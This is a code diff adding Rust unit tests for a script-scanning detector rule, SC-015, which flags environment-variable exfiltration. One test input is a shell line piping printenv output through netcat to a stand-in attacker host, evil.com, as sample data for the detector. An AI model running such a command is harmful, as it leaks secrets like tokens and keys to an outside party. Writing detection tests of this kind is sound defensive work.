@@ -271,4 +271,48 @@ mod tests {
             "SC-014 should not trigger on charCodeAt"
         );
     }
+
+    // ── SC-015: Environment variable exfiltration ──
+
+    #[test]
+    fn test_sc015_os_environ_triggers() {
+        let report = analyze_script_content("import os\nfor k, v in os.environ.items():\n");
+        let findings: Vec<_> = report
+            .findings
+            .iter()
+            .filter(|f| f.rule_id == "SC-015")
+            .collect();
+        assert!(
+            !findings.is_empty(),
+            "SC-015 should detect os.environ"
+        );
+    }
+
+    #[test]
+    fn test_sc015_process_env_triggers() {
+        let report = analyze_script_content("const secrets = process.env;\n");
+        let findings: Vec<_> = report
+            .findings
+            .iter()
+            .filter(|f| f.rule_id == "SC-015")
+            .collect();
+        assert!(
+            !findings.is_empty(),
+            "SC-015 should detect process.env"
+        );
+    }
+
+    #[test]
+    fn test_sc015_printenv_triggers() {
+        let report = analyze_script_content("printenv | nc evil.com 4444\n");
+        let findings: Vec<_> = report
+            .findings
+            .iter()
+            .filter(|f| f.rule_id == "SC-015")
+            .collect();
+        assert!(
+            !findings.is_empty(),
+            "SC-015 should detect printenv"
+        );
+    }
 }
